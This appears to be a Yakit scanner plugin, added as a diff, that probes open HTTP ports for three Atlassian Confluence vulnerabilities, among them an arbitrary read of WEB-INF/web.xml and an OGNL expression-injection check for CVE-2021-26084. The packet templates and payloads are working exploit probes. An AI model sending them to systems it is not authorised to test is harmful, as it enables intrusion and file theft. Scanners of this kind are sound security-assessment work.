@@ -1,0 +1,127 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+// 准备发送的报文模版 
+
+
+
+PacketGet = `GET {{params(payload)}} HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+`
+
+
+PacketPost = `POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1
+Host: {{params(target)}}
+Accept: */*
+Accept-Encoding: gzip
+Content-Length: 2
+Content-Type: application/json;charset=utf-8
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+
+{{params(payload)}}
+`
+//漏洞检测规则函数 
+rules = []
+addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "packet": packet,
+        "payload": payload,
+        "check": check,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+
+
+//填充对应的漏洞检测规则
+addRule(PacketGet,`/spaces/viewdefaultdecorator.action?decoratorName`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `confluence-init.properties`,`View Default Decorator`){
+        return true
+    }
+    return false
+},"信息泄露","confluence-cve-2015-8399","low","https://www.anquanke.com/vul/id/1150798")
+
+
+payload = str.f(`/s/%s/_/;/WEB-INF/web.xml`,str.RandStr(6))
+addRule(PacketGet,payload,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `<display-name>Confluence</display-name>`,`com.atlassian.confluence.setup.ConfluenceAppConfig`){
+        return true
+    }
+    return false
+},"任意文件读取","confluence-cve-2021-26085-arbitrary-file-read","critical","https://packetstormsecurity.com/files/164401/Atlassian-Confluence-Server-7.5.1-Arbitrary-File-Read.html")
+
+
+
+
+addRule(PacketPost,`queryString=\u0027%2b%7b988298%2B616748%7d%2b\u0027`,func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `1605046`){
+        return true
+    }
+    return false
+},"代码执行","confluence-cve-2021-26084","critical","https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html")
+
+
+
+//漏洞检测handle 
+handleRule = func(swg, isTls, addr, rule) {
+    swg.Add()
+    go func{
+        defer swg.Done()
+
+        defer func{
+            recover()
+        }
+
+        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
+        if err != nil {
+            yakit.Error("poc.HTTP error: %v", err)
+            return
+        }
+        header, body = poc.Split(resp)
+        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
+        url = urlIns.String()
+        if rule.check(rspIns, header, body) {
+            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
+            risk.NewRisk(
+                url, risk.severity(rule.severity), 
+                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
+                risk.titleVerbose(sprintf("reference %v", rule.reference)),
+                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
+                risk.payload(rule.payload), risk.details({
+                    "request": req,
+                    "response": resp,
+                    "url": url,
+                }),
+            )
+            return
+        }
+        return
+    }
+}
+
+
+
+handle = func(result) {
+    if !result.IsOpen() {
+        return
+    }
+
+    //判断是否是http
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+    addr = str.HostPort(result.Target, result.Port)
+    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
+
+    // 漏洞检测
+    swg = sync.NewSizedWaitGroup(10)
+    for _, rule = range rules {
+        handleRule(swg, isTls, addr, rule)
+    }
+    swg.Wait()
+}
